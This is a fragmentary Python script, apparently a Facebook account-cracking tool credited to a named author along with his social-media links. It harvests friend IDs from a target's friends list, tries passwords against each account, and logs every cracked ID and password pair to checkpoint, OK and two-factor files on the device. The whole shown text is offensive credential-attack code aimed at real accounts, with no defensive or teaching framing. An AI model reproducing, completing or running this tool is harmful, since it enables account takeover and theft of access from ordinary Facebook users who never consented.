...
fb="https://www.facebook.com/sardarinsidiiw?mibextid=ZbWKwL"

wp="923463299102"

github="github.com/Shane404207"

yt="https://youtube.com/@S9RD9RTRIICK3R3M"

web="www.sardar.com"

author="Danish sardar"
...
def public_cloning():
        ...
        for ouqat in range(int(limit3)):
                ...
                try:
                        ...
                        for abbas in DANIS['friends']['data']:
...
def crackmbasic(idf,pwv):
        ...
        for pw in pwv:
                        ...
                        if "www.facebook.com" in r.text:
                                ...
                                print(f'   \r {rp}[DANIS-CP] {idf} | {pw}{s}')     

                                open('/sdcard/DANIS_cp.txt','a').write(roid+'|'+pw+'\n')
                                ...
                                print(f'   \r {rg}[DANIS-OK] {roid} | {pw}{s}')

                                open('/sdcard/DANIS_ok.txt','a').write(roid+'|'+pw+'\n')

                                break

                        elif "SMS shortly" in r.text:

                                print(f'   \r {rc}[DANIS-2F] {idf} | {pw}{s}')

                                open('/sdcard/DANIS_2f.txt','a').write(roid+'|'+pw+'\n')
